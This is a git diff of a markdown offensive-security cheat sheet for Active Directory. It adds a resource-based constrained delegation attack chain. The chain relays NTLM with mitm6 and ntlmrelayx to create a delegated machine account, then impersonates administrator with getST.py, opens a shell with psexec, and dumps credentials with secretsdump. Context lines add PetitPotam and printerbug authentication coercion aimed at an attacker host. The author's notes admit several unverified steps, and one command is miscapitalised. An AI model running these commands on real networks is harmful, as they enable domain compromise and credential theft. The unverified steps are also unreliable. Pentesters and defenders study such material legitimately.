@@ -97,7 +97,7 @@ python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
 
 - However, since printerbug and PetitPotam both needed authentication to work, we could have just used a tool like ldapdomaindump to directly bind to LDAP ourselves and dump the data directly. To do this unauthenticated use mitm6!
 
-#### Mitm6
+## Mitm6
 - In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.
 - However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.
 - Spoof any requests for internal resources
@@ -125,4 +125,45 @@ ntlmrelayx.py -t ldaps://<DC IP> --add-computer <COMPUTER NAME>
 python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@80/a <TARGET>
 
 python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
+```
+
+- When computer account is created. This account can be used to enumerate the domain!
+
+#### Resource Based Constrained Delegation Webclient Attack
+- Requirements:
+  - On a Domain Controller to have the LDAP server signing not enforced (default value) (Requires authentication to check)
+  - On a Domain Controller to have the LDAPS channel binding not required (default value)
+  - Able to add new machines accounts (default value this quota is 10) (Requires authentication to check)
+  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity) (Requires authentication to check)
+  - A DNS record pointing to the attacker’s machine (By default authenticated users can do this) (Requires authentication to add)
+
+#### Check LDAPS Binding
+- https://github.com/zyn3rgy/LdapRelayScan
+```
+python3 LdapRelayScan.py -method LDAPS -dc-ip <IP>
+```
+
+#### Start mitm6 and NTLMRelay
+```
+sudo mitm6 -d <DOMAIN> --ignore-nofqdn
+sudo ntlmrelayx.py -t ldaps://<DC IP> --delegate-access 
+```
+
+- When computer account is created. This account can be used to enumerate the domain!
+
+#### Check for a user to impersonate
+- Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
+- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
+- Need to check how this can be impersonated exactly with a computer account. You can just use it in a PSCredential object if im correct! Need to double check!
+```
+Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
+```
+
+#### Impersonate any user and exploit
+- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
+```
+getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
+Export KRB5CCNAME=administrator.ccache
+python3 Psexec.py -k -no-pass <TARGET FQDN>
+python3 Secretsdump.py -k <TARGET FQDN>
 ```
